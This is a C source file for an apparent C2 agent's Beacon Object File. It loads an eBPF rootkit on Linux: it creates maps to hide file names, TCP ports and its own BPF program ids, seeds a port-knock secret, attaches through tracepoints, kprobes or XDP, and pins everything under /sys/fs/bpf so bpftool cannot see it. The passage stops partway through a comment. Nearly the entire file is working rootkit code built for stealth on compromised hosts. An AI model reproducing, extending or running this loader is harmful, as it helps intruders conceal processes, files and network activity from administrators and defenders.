/// ebpf_load.c — BOF: full eBPF rootkit loader (Phase 2, zero execve)
///
/// Loads a raw BPF instruction stream, creates the rootkit map set (fixed
/// layout mirroring src_agent/bpf/common.h), seeds the config maps, attaches
/// via tracepoint perf-events / kprobe events / XDP bpf_link, and pins
/// everything under /sys/fs/bpf for the helper + unload paths.
///
/// Usage:
///   execute bof ebpf_load.o <insns.bin> <mapreloc> <prog_type> <attach> <target> <names> <ports> <key16> <pin>
///
///   insns.bin: raw instruction stream (build_bpf.sh emits per-module files)
///   mapreloc:  "<insn_idx> <map_decl_idx> <name>" lines (build_bpf.sh emits
///              <mod>.mapreloc.txt) — the BOF patches insn[idx].src_reg=1,
///              insn[idx].imm=<map fd> before PROG_LOAD
///   prog_type: 5=tracepoint (BPF_PROG_TYPE_TRACEPOINT), 6=xdp, 2=kprobe
///   attach:    0=none  1=tracepoint  2=xdp  3=kprobe(debugfs event)
///   target:    attach==1: "syscalls/sys_exit_getdents64" (category/name)
///              attach==2: "eth0" (ifindex name)
///              attach==3: "p:ax_group/ax_tcp4 tcp4_seq_show"  ("r:" for kretprobe)
///   names:     NUL-separated dirent names to hide ("" = none)
///   ports:     comma-separated decimal ports to hide in /proc/net/tcp
///   key16:     16 raw bytes — Knock shared secret
///   pin:       unique pin name (objects land at /sys/fs/bpf/<pin>[_prog|_mapN])
///
/// Map layout (FIXED — must match common.h declaration order):
///   0 hide_names    HASH(64->1, 32)
///   1 hidden_bpf_ids HASH(4->1, 64)
///   2 knock_key     ARRAY(4->16, 1)
///   3 knock_seen    LRU_PERCPU_HASH(4->1, 1024)
///   4 events        RINGBUF(65536)
///   5 hidden_ports  HASH(2->1, 64)

#include "bof_api.h"

#define BPF_MAP_CREATE  0
#define BPF_PROG_LOAD   5
#define BPF_OBJ_PIN     6
#define BPF_MAP_UPDATE_ELEM 2
#define BPF_LINK_CREATE 28

// ── ISS-007：给 hidden_bpf_ids 补写入方 ─────────────────────────────────
// bpf_filter 拦 PROG/MAP/BTF/LINK 四条 GET_FD_BY_ID（见 bpf_filter.c），命中
// hidden_bpf_ids 就把用户态 id 改写成 0 → 内核 -ENOENT → 对象从 bpftool 枚举
// 里消失。过滤器本身没问题，缺的是**从来没人往这张 map 里写过**。
//
// 登记面设计（P8 起改为「构造即知道」，**不再扫 /sys/fs/bpf**）：
//   ① 每个被 pin 的对象都是 ebpf_load 自己 pin 的，而 pin 的那一刻 **fd 就在手上**
//      —— id 直接取，一张目录都不用列。用 id 而非名字做身份：我们的 prog 加载时
//      prog_name 全零（§4 的 bpf_attr_load 只填了 type/insn_cnt/insns/license），
//      名字这条路不通。
//   ② 登记进**自己这张** hidden_bpf_ids（map_fds[1]）之后，再走 §6e 的注册表补跨
//      实例那一半。别把这句读成"扇出多余"：对**多个 bpf_filter 实例**确实多余
//      （每份钩子各查各的表、各藏各的 prog），但对**别的模块**不成立 —— hide /
//      knock / redact 的钩子挂在别的事件上，它们的 id 只有进了 bpf_filter 的表才
//      藏得住。P8 第一版就是漏了这一半，p21 双模块加载当场抓到（基线 13 → 14）。
//
// ⚠ 为什么必须放弃扫描（P8 / ISS-061）：hide_names 的过滤**无目录限定、无 uid 豁免**
//   （hide.c 的 getdents hook 对 root、对本进程一视同仁）。一旦 §6c 把 `<pin>_map0`
//   自己也登记进去，扫 /sys/fs/bpf 就永远列不出任何东西 —— 而且**不报错**：
//   清单为空 → 登记 0 条 → 回执照打，只是 bpftool 从此又看得见我们的 prog。
//   旧实现（ax_collect_ours 收集 + ax_hide_register 扇出）正是踩在这里，
//   所以 P8 把它们整段删掉，改成下面的 fd 直取。
#define BPF_OBJ_GET            7
#define BPF_OBJ_GET_INFO_BY_FD 15
#define BPF_MAP_TYPE_HASH      1

#define MAP_HASH          1
#define MAP_ARRAY         2
#define MAP_LRU_PERCPU_HASH 5
#define MAP_LRU_HASH      9
#define MAP_RINGBUF      27

#define BPF_TRACEPOINT 5
#define BPF_XDP         6
#define BPF_KPROBE      2

#define PERF_TYPE_TRACEPOINT 2
#define PERF_FLAG_FD_CLOEXEC 8UL        /* NOT O_CLOEXEC (0x80000) — perf has its own */
#define PERF_EVENT_IOC_ENABLE  0x00002400
#define PERF_EVENT_IOC_SET_BPF 0x40042408
#define BPF_XDP_ATTACH 37               /* enum bpf_attach_type: BPF_XDP (6 was wrong) */

// ── bpf_attr layouts (kernel 6.8 UAPI) ──

struct bpf_attr_map {
    unsigned int  map_type;
    unsigned int  key_size;
    unsigned int  value_size;
    unsigned int  max_entries;
    unsigned int  map_flags;
    unsigned int  inner_map_fd;
    unsigned int  numa_node;
    char          map_name[16];
};

struct bpf_attr_load {
    unsigned int  prog_type;
    unsigned int  insn_cnt;
    unsigned long insns;
    unsigned long license;
    unsigned int  log_level;
    unsigned int  log_size;
    unsigned long log_buf;
    unsigned int  kern_version;
    unsigned int  prog_flags;
    char          prog_name[16];
    unsigned int  prog_ifindex;
    unsigned int  expected_attach_type;
    unsigned int  prog_btf_fd;
    unsigned int  func_info_rec_size;
    unsigned long func_info;
    unsigned int  func_info_cnt;
    unsigned int  line_info_rec_size;
    unsigned long line_info;
    unsigned int  line_info_cnt;
    unsigned int  attach_btf_id;
    unsigned int  attach_prog_fd;
    unsigned int  core_relo_cnt;
    unsigned long fd_array;      // pointer to u32 map-fd array
    unsigned long core_relos;
    unsigned int  core_relo_rec_size;
    unsigned int  core_relo_insn_off;
};

struct bpf_attr_update {
    unsigned long map_fd;
    unsigned long key;
    unsigned long value;
    unsigned long flags;
};

struct bpf_attr_link {
    unsigned int  prog_fd;
    unsigned int  target_fd;
    unsigned int  attach_type;
    unsigned int  flags;
};

struct bpf_attr_pin {
    unsigned long pathname;
    unsigned int  bpf_fd;   // 0 = unpin
};

struct bpf_attr_get {            // BPF_OBJ_GET
    unsigned long pathname;
    unsigned int  bpf_fd;
    unsigned int  file_flags;
};

struct bpf_attr_info {           // BPF_OBJ_GET_INFO_BY_FD
    unsigned int  bpf_fd;
    unsigned int  info_len;
    unsigned long info;
};

// prog / map / link 三种 info 的**前两个字段都是** { __u32 type; __u32 id; }，
// 所以一个 40 字节缓冲三者通用（opsec.c 的 ax_bpf_map_info 同款形状，已被
// p13 验过）。对 map 而言紧随其后正好是 key_size/value_size/max_entries ——
// 身份判据要用到，这也是本结构体不能只声明 8 字节的原因。
struct ax_obj_info {
    unsigned int type;
    unsigned int id;
    unsigned int key_size;
    unsigned int value_size;
    unsigned int max_entries;
    unsigned int map_flags;
    char         name[16];
};

// 与 host_recon.c 等 BOF 同款本地定义（getdents64 的原始记录）。
struct linux_dirent64 {
    unsigned long  d_ino;
    long           d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[];
};

static char g_pin[128];
static int  g_link_id;   // P8 §6：XDP link 的 id 必须在 fd 关闭前存下

/* The BOF arg ABI is (4B LE len + bytes) with NO NUL terminator — the length
 * excludes any terminator and none is appended (see matrix_resolver.go's
 * reference packer, and memfd_exec.c which patches a NUL in place for the same
 * reason).  So any field handed to a path/syscall/printf API must first be
 * copied into a terminated local; otherwise the call reads straight into the
 * next field's length word and fails with ENOENT. */
static int ax_cstr(char *dst, int cap, const char *src, int len) {
    if (!dst || cap <= 0) return 0;
    dst[0] = 0;
    if (!src || len <= 0) return 0;
    if (len > cap - 1) len = cap - 1;
    AxMemcpy(dst, src, len);
    dst[len] = 0;
    return len;
}

static int ax_mkpath(char *buf, int cap, const char *suffix) {
    if (AxStrlen(g_pin) == 0 || AxStrlen(g_pin) + AxStrlen(suffix) + 1 > (unsigned)cap) return -1;
    AxStrcpy(buf, "/sys/fs/bpf/");
    AxStrcat(buf, g_pin);
    AxStrcat(buf, suffix);
    return 0;
}

static long ax_pin_obj(int fd, const char *suffix) {
    char path[160];
    if (ax_mkpath(path, sizeof(path), suffix) != 0) return -1;
    struct bpf_attr_pin attr;
    AxMemset(&attr, 0, sizeof(attr));
    attr.pathname = (unsigned long)path;
    attr.bpf_fd = (unsigned int)fd;
    return AxBpf(BPF_OBJ_PIN, &attr, sizeof(attr));
}

static long ax_obj_get(const char *path) {
    struct bpf_attr_get ga;
    AxMemset(&ga, 0, sizeof(ga));
    ga.pathname = (unsigned long)path;
    return AxBpf(BPF_OBJ_GET, &ga, sizeof(ga));
}

static int ax_obj_id(int fd) {
    struct ax_obj_info oi;
    struct bpf_attr_info ia;
    AxMemset(&oi, 0, sizeof(oi));
    AxMemset(&ia, 0, sizeof(ia));
    ia.bpf_fd   = (unsigned int)fd;
    ia.info_len = (unsigned int)sizeof(oi);
    ia.info     = (unsigned long)&oi;
    if (AxBpf(BPF_OBJ_GET_INFO_BY_FD, &ia, sizeof(ia)) < 0) return -1;
    return (int)oi.id;
}

static void ax_id_add(int map_fd, int id) {
    unsigned int k;
    unsigned char v = 1;
    struct bpf_attr_update up;
    if (map_fd < 0 || id <= 0) return;
    k = (unsigned int)id;
    AxMemset(&up, 0, sizeof(up));
    up.map_fd = (unsigned long)map_fd;
    up.key    = (unsigned long)&k;
    up.value  = (unsigned long)&v;
    AxBpf(BPF_MAP_UPDATE_ELEM, &up, sizeof(up));
}


static long ax_map_create(unsigned int type, unsigned int ksz, unsigned int vsz,
                          unsigned int max, const char *name, int idx) {
    struct bpf_attr_map attr;
    AxMemset(&attr, 0, sizeof(attr));
    attr.map_type = type;
    attr.key_size = ksz;
    attr.value_size = vsz;
    attr.max_entries = max;
    char nm[16];
    AxSnprintf(nm, sizeof(nm), "ax_m%d", idx);
    for (int i = 0; i < 15 && nm[i]; i++) attr.map_name[i] = nm[i];
    return AxBpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int ax_read_file_hex(const char *path, int *out) {
    char buf[64];
    int fd = AxOpenFile(path, 0, 0);
    if (fd < 0) return -1;
    int n = AxReadFile(fd, buf, sizeof(buf) - 1);
    AxCloseFile(fd);
    if (n <= 0) return -1;
    buf[n] = 0;
    int v = 0;
    for (int i = 0; i < n && buf[i] >= '0' && buf[i] <= '9'; i++)
        v = v * 10 + (buf[i] - '0');
    *out = v;
    return 0;
}

static int ax_kprobe_event(const char *spec) {
    // "p:group/name func" or "r:group/name func" — written verbatim to
    // /sys/kernel/tracing/kprobe_events, then the event id read from
    // /sys/kernel/tracing/events/group/name/id
    char path[160], idp[192], group[64], name[64], func[128];
    char reg;
    int fi = 0;
    reg = spec[0];
    if (reg != 'p' && reg != 'r') return -1;
    const char *p = spec + 2;
    int gi = 0, ni = 0;
    while (*p && *p != '/' && gi < 62) group[gi++] = *p++;
    if (*p != '/') return -1; p++;
    while (*p && *p != ' ' && ni < 62) name[ni++] = *p++;
    if (*p != ' ') return -1; p++;
    while (*p && fi < 126) func[fi++] = *p++;
    if (fi == 0) return -1;
    group[gi] = 0; name[ni] = 0; func[fi] = 0;

    AxStrcpy(path, "/sys/kernel/tracing/kprobe_events");
    int fd = AxOpenFile(path, 1 | 0x400, 0644);  // O_WRONLY|O_APPEND
    if (fd < 0) return -1;
    AxWriteFile(fd, spec, AxStrlen(spec));
    AxWriteFile(fd, "\n", 1);
    AxCloseFile(fd);

    AxSnprintf(idp, sizeof(idp), "/sys/kernel/tracing/events/%s/%s/id", group, name);
    int tp_id;
    if (ax_read_file_hex(idp, &tp_id) != 0) return -1;
    return tp_id;
}

// struct perf_event_attr, first 64 bytes = PERF_ATTR_SIZE_VER0 (the published
// ABI size).  perf_event_open takes a pointer to this; the previous code passed
// the event type and tracepoint id as two loose ints, so the kernel read a bogus
// pointer and returned EINVAL on every attach.
struct ax_perf_attr {
    unsigned int       type;
    unsigned int       size;
    unsigned long long config;
    unsigned long long sample_period;
    unsigned long long sample_type;
    unsigned long long read_format;
    unsigned long long flags;
    unsigned int       wakeup_events;
    unsigned int       bp_type;
    unsigned long long bp_addr;
};

static int g_pefds[64];
static int g_npefd = 0;
static int g_ncpu = 0;      /* how many CPUs /sys/.../online advertised */
static int g_badcpu = -1;   /* first CPU whose perf event could not be hooked */
static long g_att_err = 0;  /* its -errno, for the attach diagnostic print */

// Online CPU list from /sys/devices/system/cpu/online ("0-1", "0,2-3", ...).
// perf_event_open(pid=-1, cpu=0) hooks CPU 0 only, so on a 2-core box every
// getdents64/read that landed on CPU 1 was unhooked: hide worked under
// `taskset -c 0 ls` and failed under `taskset -c 1 ls`.  Hook them all.
static int ax_online_cpus(int *out, int cap) {
    char buf[128];
    int n = 0, r;
    int fd = AxOpenFile("/sys/devices/system/cpu/online", 0, 0);
    if (fd < 0) { if (cap > 0) out[n++] = 0; return n; }
    r = AxReadFile(fd, buf, sizeof(buf) - 1);
    AxCloseFile(fd);
    if (r <= 0) { if (cap > 0) out[n++] = 0; return n; }
    buf[r] = 0;
    const char *p = buf;
    while (*p && n < cap) {
        int lo, hi;
        if (*p < '0' || *p > '9') { p++; continue; }
        lo = 0;
        while (*p >= '0' && *p <= '9') lo = lo * 10 + (*p++ - '0');
        hi = lo;
        if (*p == '-') { p++; hi = 0; while (*p >= '0' && *p <= '9') hi = hi * 10 + (*p++ - '0'); }
        for (int c = lo; c <= hi && n < cap; c++) out[n++] = c;
    }
    if (n == 0 && cap > 0) out[n++] = 0;
    return n;
}

// Returns the number of CPUs hooked (>0), or the negative errno of the first
// failure (-1 if the ioctl failed everywhere).  fds are kept open for the life
// of the agent process — that is what keeps the program attached.
static long ax_attach_tracepoint(int tp_id, int prog_fd) {
    struct ax_perf_attr at;
    int cpus[64];
    int ncpu, ok = 0;
    AxMemset(&at, 0, sizeof(at));
    at.type          = PERF_TYPE_TRACEPOINT;
    at.size          = sizeof(at);
    at.config        = (unsigned long long)tp_id;
    at.sample_period = 1;
    at.wakeup_events = 1;

    ncpu = ax_online_cpus(cpus, 64);
    g_ncpu = ncpu;
    for (int i = 0; i < ncpu; i++) {
        long pefd = AxPerfEventOpen(&at, -1, cpus[i], -1, PERF_FLAG_FD_CLOEXEC);
        long r;
        if (pefd < 0) {
            // -EEXIST (17): tracepoints register their perf probe *globally*, so the
            // first event already covers every CPU and the next per-CPU open is
            // refused.  Measured on 6.8 with gap10 T2b/T2d: cpu=1 returns -17 while
            // CPU1 is in fact hooked.  Count it as covered, not as a failure.
            if (pefd == -17) { ok++; continue; }
            g_badcpu = cpus[i]; g_att_err = pefd;
            if (ok == 0 && i + 1 >= ncpu) return pefd;  // nothing worked: report it
            continue;
        }
        r = AxIoctl((int)pefd, PERF_EVENT_IOC_SET_BPF, (void *)(unsigned long)prog_fd);
        if (r < 0) { g_badcpu = cpus[i]; g_att_err = r; AxCloseFile((int)pefd); continue; }
        AxIoctl((int)pefd, PERF_EVENT_IOC_ENABLE, (void *)0);
        if (g_npefd < 64) g_pefds[g_npefd++] = (int)pefd;
        ok++;
    }
    return ok > 0 ? (long)ok : -1;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    int path_len = 0, reloc_len = 0, target_len = 0, names_len = 0, ports_len = 0, key_len = 0, pin_len = 0;
    char *path = BeaconDataExtract(&parser, &path_len);
    char *relocpath = BeaconDataExtract(&parser, &reloc_len);
    int prog_type = BeaconDataInt(&parser);
    int attach = BeaconDataInt(&parser);
    char *target = BeaconDataExtract(&parser, &target_len);
    char *names = BeaconDataExtract(&parser, &names_len);
    char *ports = BeaconDataExtract(&parser, &ports_len);
    char *key16 = BeaconDataExtract(&parser, &key_len);
    char *pin = BeaconDataExtract(&parser, &pin_len);
    if (!path || path_len <= 0 || !pin || pin_len <= 0 || pin_len > 127) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ebpf_load: bad args (need insns + pin)\n");
        return;
    }
    // The arg blob is not NUL-terminated (it ends at the buffer end), so a
    // strcpy would read past it.  pin_len is already bounded to <=127 and
    // g_pin is 128 bytes, so a length-bounded copy is safe.
    AxMemset(g_pin, 0, sizeof(g_pin));
    AxMemcpy(g_pin, pin, pin_len);
    if (key_len < 16) key16 = (char *)0;

    // Terminate the fields that get used as C strings (paths / iface names).
    char pathbuf[256], relocbuf[256], targetbuf[224];
    if (ax_cstr(pathbuf, sizeof(pathbuf), path, path_len) <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ebpf_load: bad insns path\n");
        return;
    }
    ax_cstr(relocbuf, sizeof(relocbuf), relocpath, reloc_len);
    ax_cstr(targetbuf, sizeof(targetbuf), target, target_len);

    char *insns = (char *)0;
    int insn_bytes = AxReadFileToBuffer(pathbuf, &insns, 8 * 1024 * 1024);
    if (insn_bytes <= 0 || !insns || (insn_bytes % 8) != 0) {
        if (insns) AxFree(insns);
        BeaconPrintf(CALLBACK_ERROR, "[-] ebpf_load: bad insn stream (%d bytes)\n", insn_bytes);
        return;
    }

    char *relocs = (char *)0;
    int reloc_bytes = 0;
    if (relocbuf[0] && reloc_len > 0)
        reloc_bytes = AxReadFileToBuffer(relocbuf, &relocs, 64 * 1024);

    // ── 1. Create the rootkit map set (fixed order = fd_array indices) ──
    int map_fds[8] = {0};   /* 预置 0：fail 清理循环不必猜哪些是真 fd */
    long m;
    m = ax_map_create(MAP_HASH, 64, 1, 32, "hide_names", 0); if (m < 0) goto fail_maps;
    map_fds[0] = (int)m;
    m = ax_map_create(MAP_HASH, 4, 1, 64, "hidden_bpf_ids", 1); if (m < 0) goto fail_maps;
    map_fds[1] = (int)m;
    m = ax_map_create(MAP_ARRAY, 4, 16, 1, "knock_key", 2); if (m < 0) goto fail_maps;
    map_fds[2] = (int)m;
    m = ax_map_create(MAP_LRU_PERCPU_HASH, 4, 1, 1024, "knock_seen", 3); if (m < 0) goto fail_maps;
    map_fds[3] = (int)m;
    m = ax_map_create(MAP_RINGBUF, 0, 0, 65536, "events", 4); if (m < 0) goto fail_maps;
    map_fds[4] = (int)m;
    m = ax_map_create(MAP_HASH, 2, 1, 64, "hidden_ports", 5); if (m < 0) goto fail_maps;
    map_fds[5] = (int)m;
    // 索引 6 = loader 私有，**不属于** rootkit 的 map 契约：记录 tracepoint 的 perf fd，
    // 供 ebpf_unload close() 后**当场** detach（否则 hide 一直生效到 agent 进程退出）。
    // mapreloc 可引用 0..7（redact 用到 6/7），map_fds 全量创建，无需重编 insns。
    m = ax_map_create(MAP_ARRAY, 4, 4, 16, "trace_fds", 6); if (m < 0) goto fail_maps;
    map_fds[6] = (int)m;
    // 索引 7 = redact.c 的 fd 状态表（(pid<<32)|fd → kind）。同样只追加在末尾：
    // 既有模块按 mapreloc 只引用 0..5，不受影响。
    m = ax_map_create(MAP_LRU_HASH, 8, 1, 4096, "redact_fds", 7); if (m < 0) goto fail_maps;
    map_fds[7] = (int)m;

    // ── 2. Seed the config maps ──
    if (key16) {
        struct bpf_attr_update upd;
        unsigned int k0 = 0;
        AxMemset(&upd, 0, sizeof(upd));
        upd.map_fd = (unsigned long)map_fds[2];
        upd.key = (unsigned long)&k0;
        upd.value = (unsigned long)key16;
        AxBpf(BPF_MAP_UPDATE_ELEM, &upd, sizeof(upd));
    }
    if (names && names_len > 0) {
        // Bounded by names_len: the arg blob has no NUL terminator, and the
        // next field's 4-byte length word follows immediately.  Scanning for
        // a NUL folded that length byte into the map key ("name" -> "name\x06"),
        // so the key never matched the real filename and hide silently failed.
        const char *n   = names;
        const char *end = names + names_len;
        while (n < end) {
            char key[64]; AxMemset(key, 0, 64);
            int l = 0;
            while (n < end && *n && l < 63) key[l++] = *n++;
            if (n < end && *n == 0) n++;  // skip NUL separator between names
            if (l == 0) continue;         // separator run: n already advanced
            struct bpf_attr_update upd;
            unsigned char one = 1;
            AxMemset(&upd, 0, sizeof(upd));
            upd.map_fd = (unsigned long)map_fds[0];
            upd.key = (unsigned long)key;
            upd.value = (unsigned long)&one;
            AxBpf(BPF_MAP_UPDATE_ELEM, &upd, sizeof(upd));
        }
    }
    if (ports && ports_len > 0) {
        // Bounded by ports_len: the arg blob has no NUL terminator, so an
        // unbounded scan would run off the end of it.
        const char *p   = ports;
        const char *end = ports + ports_len;
        while (p < end) {
            int v = 0;
            while (p < end && *p >= '0' && *p <= '9') { v = v * 10 + (*p - '0'); p++; }
            if (v > 0 && v < 65536) {
                unsigned short key = (unsigned short)v;
                unsigned char one = 1;
                struct bpf_attr_update upd;
                AxMemset(&upd, 0, sizeof(upd));
                upd.map_fd = (unsigned long)map_fds[5];
                upd.key = (unsigned long)&key;
                upd.value = (unsigned long)&one;
                AxBpf(BPF_MAP_UPDATE_ELEM, &upd, sizeof(upd));
            }
            // Advance: ',' is the separator, any other non-digit is junk that
            // must still move p.  Without the resync a token like "8x0" left p
            // parked on 'x' and the loop spun forever inside the agent (the
            // beacon never came back).
            if (p < end && *p == ',') p++;
            else if (p < end && (*p < '0' || *p > '9')) p++;
        }
    }

    // ── 3. Patch the map references (mapreloc lines: "<insn_idx> <map_idx> <name>") ──
    // BPF insn = 8 bytes: code(1) regs(1) off(2 LE) imm(4 LE); map loads use
    // src_reg=1 (BPF_PSEUDO_MAP_FD) + imm=<map fd>.
    if (relocs && reloc_bytes > 0) {
        char *line = relocs;
        while (line < relocs + reloc_bytes) {
            // parse insn idx
            int idx = 0, mapidx = -1;
            while (*line >= '0' && *line <= '9') { idx = idx * 10 + (*line - '0'); line++; }
            while (*line == ' ' || *line == '\t') line++;
            if (*line >= '0' && *line <= '9') {
                mapidx = 0;
                while (*line >= '0' && *line <= '9') { mapidx = mapidx * 10 + (*line - '0'); line++; }
            }
            while (*line && *line != '\n') line++;
            if (*line == '\n') line++;
            /* ★ 上界必须是 map_fds 的真实上界（8），不是历史值 5。
             * redact 引用 redact_fds = 索引 7（见 common.h 的 map 固定表）；
             * 越过 5 的引用被 continue 跳过 → 该指令保持 src_reg=0、imm=占位符，
             * 内核于是看到 bpf_map_lookup_elem(0, ...)，
             * ARG_CONST_MAP_PTR 检查直接返回 -EACCES(13) —— 症状是
             * "PROG_LOAD failed (err=13)"，与 verifier 复杂度/权限都无关。 */
            if (mapidx < 0 || mapidx > 7) continue;
            if (idx < 0 || idx >= insn_bytes / 8) continue;
            unsigned char *insn = (unsigned char *)insns + idx * 8;
            insn[1] = (unsigned char)((insn[1] & 0x0F) | 0x10);  // src_reg = 1
            unsigned int fd = (unsigned int)map_fds[mapidx];
            insn[4] = (unsigned char)(fd & 0xFF);
            insn[5] = (unsigned char)((fd >> 8) & 0xFF);
            insn[6] = (unsigned char)((fd >> 16) & 0xFF);
            insn[7] = (unsigned char)((fd >> 24) & 0xFF);
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] ebpf_load: patched map refs from %s\n", relocbuf);
    }
    if (relocs) AxFree(relocs);

    // ── 4. Load the program ──
    struct bpf_attr_load attr;
    AxMemset(&attr, 0, sizeof(attr));
    attr.prog_type = (unsigned int)prog_type;
    attr.insn_cnt = (unsigned int)(insn_bytes / 8);
    attr.insns = (unsigned long)insns;
    attr.license = (unsigned long)(const char *)"GPL";
    long prog_fd = AxBpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    AxFree(insns);
    if (prog_fd < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ebpf_load: PROG_LOAD failed (err=%ld)\n", -prog_fd);
        goto fail_maps;
    }

    // ── 4. Attach ──
    if (attach == 1 && targetbuf[0]) {
        char idp[192];
        AxSnprintf(idp, sizeof(idp), "/sys/kernel/tracing/events/%s/id", targetbuf);
        int tp_id;
        if (ax_read_file_hex(idp, &tp_id) != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] ebpf_load: tracepoint %s not found\n", targetbuf);
            goto fail;
        }
        long pefd = ax_attach_tracepoint(tp_id, (int)prog_fd);
        if (pefd < 0)
            BeaconPrintf(CALLBACK_ERROR, "[-] ebpf_load: tracepoint attach failed (%ld)\n", -pefd);
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[+] ebpf_load: tracepoint %s attached (cpus=%ld/%d badcpu=%d err=%ld)\n", targetbuf, pefd, g_ncpu, g_badcpu, g_att_err);
    } else if (attach == 3 && targetbuf[0]) {
        int tp_id = ax_kprobe_event(targetbuf);
        if (tp_id < 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] ebpf_load: kprobe event setup failed\n");
            goto fail;
        }
        long pefd = ax_attach_tracepoint(tp_id, (int)prog_fd);
        if (pefd < 0)
            BeaconPrintf(CALLBACK_ERROR, "[-] ebpf_load: kprobe attach failed (%ld)\n", -pefd);
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[+] ebpf_load: kprobe '%s' attached (cpus=%ld/%d badcpu=%d err=%ld)\n", targetbuf, pefd, g_ncpu, g_badcpu, g_att_err);
    } else if (attach == 2 && targetbuf[0]) {
        // ifindex by interface name via /sys/class/net/<name>/ifindex
        char idp[160];
        AxSnprintf(idp, sizeof(idp), "/sys/class/net/%s/ifindex", targetbuf);
        int ifindex;
        if (ax_read_file_hex(idp, &ifindex) != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] ebpf_load: iface %s not found\n", targetbuf);
            goto fail;
        }
        struct bpf_attr_link lattr;
        AxMemset(&lattr, 0, sizeof(lattr));
        lattr.prog_fd = (unsigned int)prog_fd;
        lattr.target_fd = (unsigned int)ifindex;
        lattr.attach_type = BPF_XDP_ATTACH;
        long link_fd = AxBpf(BPF_LINK_CREATE, &lattr, sizeof(lattr));
        if (link_fd < 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] ebpf_load: XDP link failed (err=%ld)\n", -link_fd);
            goto fail;
        }
        ax_pin_obj((int)link_fd, "_link");
        g_link_id = ax_obj_id((int)link_fd);   // P8 §6：下一行就关 fd，id 先存下
        BeaconPrintf(CALLBACK_OUTPUT, "[+] ebpf_load: XDP attached on %s (ifindex=%d, link=%ld)\n", targetbuf, ifindex, link_fd);
        // link 对象自己就是 attach 的载体：pin 持有它就够，fd 必须关。否则
        // ebpf_unload unlink 掉 <pin>_link 之后 link 仍被这个 fd 吊着 →
        // XDP 程序继续挂在网卡上（实测：卸载 4 模块后 prog id 713 存活，
        // 只有 agent 进程死才消失），且 /proc/<pid>/fd 多一个常驻 inode。
        AxCloseFile((int)link_fd);
    }

    // ── 4.5 记下 tracepoint perf fd（供 ebpf_unload 当场 detach，ISS-008）──
    // 必须在 pin 之前：unload 要靠 /sys/fs/bpf/<pin>_map6 把这批 fd 读回去 close。
    for (int i = 0; i < g_npefd && i < 16; i++) {
        struct bpf_attr_update up;
        unsigned int k = (unsigned int)i;
        int v = g_pefds[i];
        AxMemset(&up, 0, sizeof(up));
        up.map_fd = (unsigned long)map_fds[6];
        up.key    = (unsigned long)&k;
        up.value  = (unsigned long)&v;
        AxBpf(BPF_MAP_UPDATE_ELEM, &up, sizeof(up));
    }

    // ── 5. Pin for the helper/unload paths ──
    ax_pin_obj((int)prog_fd, "_prog");
    for (int i = 0; i < 8; i++) {
        char sfx[16];
        AxSnprintf(sfx, sizeof(sfx), "_map%d", i);
        ax_pin_obj(map_fds[i], sfx);
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] ebpf_load: prog fd=%ld type=%d attach=%d, maps seeded, pinned as /sys/fs/bpf/%s_*\n"
        "[+] ebpf_load: ringbuf fd=%d (events map) — hand to helper via pinned path\n",
        prog_fd, prog_type, attach, g_pin, map_fds[4]);

    // ── 6. 登记内核对象 id（ISS-007 / P8：改用**手上的 fd**，不扫目录）──
    // 返回值只出现在回执里，**不改控制流** —— 登记失败只是"bpftool 仍可见"，
    // 不该让加载整体失败。id 为 0 的项（取不到 info）跳过不写：写 0 进
    // hidden_bpf_ids 等于给"id=0"这个哨兵值建了一条命中项。
    //
    // ★ P8 §6e 补上跨实例那一半：hidden_bpf_ids 有**多份**，但只有 sys_enter_bpf
    //   钩子（bpf_filter 实例）那张会被读。所以
    //     · 我是 bpf_filter → 认领 sink，把**别人先登记**的 id 重放进自己这张；
    //     · 我不是        → 登记自己，sink 已知时由 core 按路径当场写过去。
    //   没有这一步，两个模块同载时非 bpf_filter 那个的 prog 会露出来（p21 双模块
    //   实测：基线 13 → 14）。身份判据与 §6c 同款：看**挂载目标**，不看模块文件名
    //   —— 文件名能改，目标点是功能本身。
    {
        unsigned int ids[12], t;
        int ids_n = 0, w = 0, put = 0;
        int is_filter = (targetbuf[0] && AxStrstr(targetbuf, "sys_enter_bpf")) ? 1 : 0;

        t = (unsigned int)ax_obj_id((int)prog_fd);
        if (t > 0) ids[ids_n++] = t;
        for (int i = 0; i < 8; i++) {
            if (map_fds[i] <= 0) continue;
            t = (unsigned int)ax_obj_id(map_fds[i]);
            if (t > 0) ids[ids_n++] = t;
        }
        if (g_link_id > 0) ids[ids_n++] = (unsigned int)g_link_id;

        for (int i = 0; i < ids_n; i++) {          // ① 自己这张表：fd 在手，最直接
            ax_id_add((int)map_fds[1], (int)ids[i]);
            w++;
        }
        if (is_filter) put = AxIdRegSink(g_pin);   // ② 认领 sink + 重放先加载者的 id
        AxIdRegAdd(ids, ids_n);                    //    再登记自己，给后来的实例
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] ebpf_load: hidden_bpf_ids <- %d/%d self%s | sink=%s replayed=%d reg=%d/48\n",
            w, ids_n, is_filter ? " [I am the bpf_filter sink]" : "",
            AxIdRegSinkPin() ? AxIdRegSinkPin() : "(none)", put, AxIdRegCount());
        if (put < 0)
            BeaconPrintf(CALLBACK_OUTPUT,
                "[!] ebpf_load: 认领 id sink 失败（<pin>_map1 打不开）—— 后来的模块只能先登记\n");
        if (AxIdRegCount() >= 48)
            BeaconPrintf(CALLBACK_OUTPUT,
                "[!] ebpf_load: id 注册表已满（48）—— 调大 bof_api.c 的 AX_IDREG_MAX\n");
    }

    // ── 6b. 把 pin 名报给 core（G7 闭环）──
    // 持久化 BOF 事后要补写 hide_names，但它们不知道 pin 名。core 只记名字、
    // 不解析 fd：按 `/sys/fs/bpf/<pin>_map0` 直接 OBJ_GET，即使这个 pin 被
